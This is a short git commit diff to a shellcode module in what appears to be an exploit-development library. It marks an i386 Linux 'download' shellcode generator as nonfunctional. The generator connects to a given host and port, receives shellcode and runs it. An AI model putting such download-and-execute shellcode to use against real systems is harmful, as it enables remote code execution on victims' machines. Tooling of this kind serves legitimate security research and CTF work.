fda77557f3a48ae26d8952f27400292c1c979e58
Mathias Svensson <mathias@diku.dk>
2012-12-07 16:15:34 +0100

    download.py is non-functional

--- pwn/shellcodes/network/download.py
+++ pwn/shellcodes/network/download.py
@@ -1,11 +1,13 @@
 from pwn import *
-#from recv import recv
 from connect import connect
 
 @shellcode_reqs(arch='i386', os='linux', network='ipv4')
 def download(host, port):
     """Args: host, port
-    Download shellcode from host on port, and run it."""
+    Download shellcode from host on port, and run it.
+    
+    NONFUNCTIONAL
+    """
     return \
         connect(host, port) + \
         recv() + \
